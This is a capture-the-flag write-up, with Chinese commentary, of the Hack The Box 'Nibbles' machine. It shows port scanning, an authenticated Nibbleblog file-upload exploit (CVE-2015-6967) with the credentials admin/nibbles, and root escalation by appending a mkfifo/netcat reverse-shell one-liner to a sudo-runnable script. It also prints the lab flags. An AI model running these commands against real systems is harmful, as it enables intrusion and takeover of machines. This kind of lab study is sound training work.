###### tags: `Hack the box` `HTB` `Easy` `Linux`

# Nibbles
```
┌──(kali㉿kali)-[~/htb]
└─$ rustscan -a 10.129.38.149 -u 5000 -t 8000 --scripts -- -n -Pn -sVC

Open 10.129.38.149:22
Open 10.129.38.149:80

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQD8ArTOHWzqhwcyAZWc2CmxfLmVVTwfLZf0zhCBREGCpS2WC3NhAKQ2zefCHCU8XTC8hY9ta5ocU+p7S52OGHlaG7HuA5Xlnihl1INNsMX7gpNcfQEYnyby+hjHWPLo4++fAyO/lB8NammyA13MzvJy8pxvB9gmCJhVPaFzG5yX6Ly8OIsvVDk+qVa5eLCIua1E7WGACUlmkEGljDvzOaBdogMQZ8TGBTqNZbShnFH1WsUxBtJNRtYfeeGjztKTQqqj4WD5atU8dqV/iwmTylpE7wdHZ+38ckuYL9dmUPLh4Li2ZgdY6XniVOBGthY5a2uJ2OFp2xe1WS9KvbYjJ/tH
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBPiFJd2F35NPKIQxKMHrgPzVzoNHOJtTtM+zlwVfxzvcXPFFuQrOL7X6Mi9YQF9QRVJpwtmV9KAtWltmk3qm4oc=
|   256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIC/RjKhT/2YPlCgFQLx+gOXhC6W3A3raTzjlXQMT8Msk
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

前往80port沒東西，只有`Hello world!`，掃目錄也沒東西，只好查看`F12`

![Nibbles_1.png](picture/Nibbles_1.png)

```
 /nibbleblog/ directory. Nothing interesting here! 
```

查看`http://10.129.38.149/nibbleblog`有一個部落格，google可找到[CVE-2015-6967](https://github.com/dix0nym/CVE-2015-6967)，直接用就可
```
┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4444

┌──(kali㉿kali)-[~/htb/CVE-2015-6967]
└─$ python3 exploit.py --url http://10.129.38.149/nibbleblog/ --username admin --password nibbles --payload shell.php
[+] Login Successful.
[+] Upload likely successfull.

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
nibbler@Nibbles:/$ 
```

在`/home/nibbler`裡面得到user.txt
```
nibbler@Nibbles:/home/nibbler$ cat user.txt
e6de5eb6df0bdc24610ae42085967f8b
```

查看`sudo -l`
```
nibbler@Nibbles:/$ sudo -l
sudo -l
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

解壓縮`personal.zip`，把reverse加到`monitor.sh`之後開nc
```
nibbler@Nibbles:/home/nibbler$ unzip personal.zip

nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.55 4445 >/tmp/f" >> monitor.sh

┌──(kali㉿kali)-[~/htb]
└─$ rlwrap -cAr nc -nvlp4445 
```

執行後得root在/root可得root.txt
```
# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@Nibbles:~# cat root.txt
17c2326bc8b92d496e0dc30219612453
```